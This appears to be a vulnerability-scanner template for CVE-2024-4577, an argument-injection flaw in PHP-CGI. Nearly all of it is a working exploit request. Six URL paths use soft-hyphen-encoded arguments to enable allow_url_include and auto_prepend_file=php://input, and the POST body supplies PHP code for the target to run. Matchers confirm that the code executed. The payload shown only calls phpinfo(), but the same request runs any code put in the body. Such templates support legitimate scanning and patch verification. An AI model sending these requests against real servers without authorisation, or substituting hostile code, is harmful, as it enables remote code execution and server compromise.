id: CVE-2024-4577
info:
  author: 0xpugal
  description: PHP affecting CGI configurations, allowing attackers to execute arbitrary
    commands via crafted URL parameters.
  name: Argument Injection in PHP-CGI
  reference:
  - https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/
  severity: critical
  tags: cve,cve2024,rce,php
requests:
- body: '<?php

    phpinfo();

    ?>

    '
  headers:
    Accept: '*/*'
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    User-Agent: curl/8.3.0
  matchers:
  - part: body
    type: word
    words:
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/test.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input'
  - '{{BaseURL}}/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/cgi-bin/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
  - '{{BaseURL}}/php-cgi/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
